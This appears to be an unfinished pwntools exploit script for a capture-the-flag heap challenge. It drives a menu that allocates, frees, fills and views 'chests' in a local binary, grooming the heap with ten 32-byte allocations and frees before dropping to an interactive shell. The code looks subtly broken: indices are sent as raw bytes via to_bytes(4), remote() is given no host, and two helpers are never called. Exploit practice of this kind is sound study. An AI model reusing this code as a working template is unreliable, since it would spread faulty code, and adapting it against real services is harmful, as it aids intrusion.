from pwn import *

def get_chest(r, idx, sizechst):
    # Choice
    r.recvuntil('>')
    r.sendline(b'1')

    # chest's number
    r.recvuntil(':')
    r.sendline(idx)

    # chest's size
    r.recvuntil(':')
    r.sendline(sizechst)

def lazy_people(r, idx):
    # Choice
    r.recvuntil('>')
    r.sendline(b'2')

    # idiot's number
    r.recvuntil(':')
    r.sendline(idx)

def fill_chest(r, idx, payload):
    # Choice
    r.recvuntil('>')
    r.sendline(b'3')

    # chest's number
    r.recvuntil('>')
    r.sendline(idx)

    # Message
    r.sendline(payload)

def review_profit(r, idx):
    # Choice
    r.recvuntil('>')
    r.sendline(b'4')

    # chest's number
    r.recvuntil(':')
    r.sendline(idx)

def exploit(checkRemote):
    if(checkRemote is True):
        r = remote()
    else:
        context.binary = ELF('./chall', checksec=False)
        r = process()
    
    for i in range(10):
        get_chest(r, i.to_bytes(4), b'32')
    # get_chest(r, b'1', b'32')
    # get_chest(r, b'2', b'32')
    # get_chest(r, b'3', b'32')
    # get_chest(r, b'4', b'32')
    # get_chest(r, b'5', b'32')
    # get_chest(r, b'6', b'32')
    # get_chest(r, b'7', b'32')
    # get_chest(r, b'8', b'32')
    
    for i in range(10):
        lazy_people(r, i.to_bytes(4))
    # lazy_people(r, b'1')
    # lazy_people(r, b'2')
    # lazy_people(r, b'3')
    # lazy_people(r, b'4')
    # lazy_people(r, b'5')
    # lazy_people(r, b'6')
    # lazy_people(r, b'7')
    # lazy_people(r, b'8')
    
    r.interactive()

exploit(False)